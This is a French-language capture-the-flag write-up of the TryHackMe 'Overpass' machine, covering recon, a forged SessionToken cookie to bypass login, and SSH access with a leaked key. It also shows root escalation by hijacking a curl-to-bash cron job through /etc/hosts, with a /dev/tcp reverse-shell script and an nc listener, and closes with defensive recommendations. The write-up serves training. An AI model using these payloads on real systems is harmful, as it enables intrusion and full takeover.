# TryHackMe: Overpass

La room **Overpass** est une machine de difficulté **Medium** sur [TryHackMe](https://tryhackme.com/room/overpass). Elle simule un gestionnaire de mots de passe développé par une équipe d’étudiants.\
L’objectif est d’identifier et d’exploiter les vulnérabilités pour obtenir dans l’ordre :

1. un accès utilisateur (`user.txt`) ;
2. une escalade de privilèges vers `root` (`root.txt`).

Ce write‑up décrit la méthodologie appliquée, les étapes de reconnaissance, l’exploitation des vulnérabilités ainsi que des recommandations pour corriger ces failles.

---

## Étape 1 : Reconnaissance

### Scan réseau

La première étape consiste à scanner la machine avec **Nmap** afin d’identifier les ports ouverts et les services exposés.

```bash
nmap -sV -T5 -O 10.10.139.53
```

**Résultats clés :**

| Port | Service | Version       |
| ---- | ------- | ------------- |
| 22   | SSH     | OpenSSH 8.0   |
| 80   | HTTP    | Apache 2.4.37 |

### Analyse du site web

Le port 80 héberge l’application web **Overpass**, un gestionnaire de mots de passe.

Avec un outil de fuzzing tel que **Gobuster**, plusieurs chemins intéressants sont découverts, notamment `/admin` et `/downloads`.

Une inspection du JavaScript côté client (`login.js`) révèle une logique d’authentification vulnérable.

---

## Étape 2 : Accès initial via contournement d’authentification

### Vulnérabilité détectée

Le fichier `login.js` montre que la session repose sur un cookie `SessionToken` défini directement à partir de la réponse serveur, sans validation supplémentaire.

En forçant la valeur de ce cookie dans le navigateur il est possible d’outrepasser l’authentification et d’accéder à `/admin` sans identifiants :

```javascript
// Dans la console du navigateur
Cookies.set("SessionToken", "CeQueTuVeux");
window.location = "/admin";
```

### Extraction de la clé SSH

La page `/admin` propose en téléchargement une **clé SSH privée** associée à l’utilisateur `james`.

```bash
chmod 600 james_rsa
ssh -i james_rsa james@10.10.139.53
```

Une fois connecté, le flag `user.txt` peut être récupéré depuis le répertoire personnel de `james`.

---

## Étape 3 : Escalade de privilèges

### Analyse des indices

Dans la session `james`, un fichier `todo.txt` mentionne un processus de build automatisé.\
L’analyse des crons affiche la ligne suivante :

```
* * * * * root curl overpass.thm/downloads/src/buildscript.sh | bash
```

Le **cron** télécharge donc chaque minute un script distant et l’exécute avec les privilèges **root** sans contrôle d’intégrité.

### Exploitation

En redirigeant le nom de domaine `overpass.thm` vers notre machine (modification locale de `/etc/hosts`), nous prenons le contrôle du script récupéré.

```bash
# /etc/hosts
10.21.208.96    overpass.thm
```

Nous hébergeons un script malveillant lançant un reverse shell root :

```bash
#!/bin/bash
bash -i >& /dev/tcp/10.21.208.96/4444 0>&1 &
```

Puis nous écoutons sur le port 4444 :

```bash
nc -lvnp 4444
```

Lorsque `cron` exécute le script, un shell root est établi et le flag `root.txt` devient accessible.

---

## Résultat final

```bash
root@overpass:~# cat /root/root.txt
THM{<redacted>}
```

---

## Recommandations de sécurité

1. **Validation stricte des sessions**\
   Ne jamais se fier uniquement à des cookies manipulables côté client.
2. **Sécurisation des cron jobs**\
   N’exécuter aucun script distant sans vérification d’intégrité (hash, signature).
3. **Contrôle des résolutions DNS locales**\
   Restreindre les modifications d’`/etc/hosts` et surveiller les anomalies DNS.
4. **Gestion sécurisée des clés SSH**\
   Éviter l’exposition de clés privées via une interface web et appliquer le principe du moindre privilège.
5. **Supervision et alertes**\
   Mettre en place une détection d’exécution de scripts distants et de modifications non autorisées.

---

## Conclusion

Cette room démontre comment des failles simples, combinées, permettent de compromettre une infrastructure complète. Elle met en évidence l’importance :

- d’une défense en profondeur ;
- de processus de développement sécurisés ;
- d’une supervision active des systèmes.

> **TLDR**\
> Un simple contournement d’authentification a ouvert la voie à l’exfiltration d’une clé SSH, puis à l’escalade root via un cron non sécurisé.

---

**Auteur :** Saad Idrissi

